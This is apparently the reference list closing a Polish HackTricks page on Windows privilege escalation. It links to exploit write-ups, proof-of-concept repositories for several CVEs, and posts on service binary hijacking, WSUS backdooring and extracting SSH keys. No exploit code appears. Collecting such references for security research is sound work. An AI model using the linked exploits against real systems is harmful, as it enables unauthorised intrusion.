- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Wyzwania z listy kontrolnej C/C++, rozwiązane](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Przejmowanie plików binarnych usług](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: Łączenie CLDFLT i wyścigów w jądrze DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: pełna możliwość odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Nadużywanie dowolnego usuwania plików w celu eskalacji uprawnień i inne świetne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Ataki na WSUS, część 2: CVE-2020-1013, jednodniowa lokalna eskalacja uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Poznajemy Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Ograniczona delegacja oparta na zasobach Kerberos: gdy zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Wyodrębnianie prywatnych kluczy SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Zmiana serwerów aktualizacji w przedsiębiorstwie w fabryki backdoorów (0_o) – część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Zmiana serwerów aktualizacji w przedsiębiorstwie w fabryki backdoorów (0_o) – część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacja uprawnień przez usunięcie folderu Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
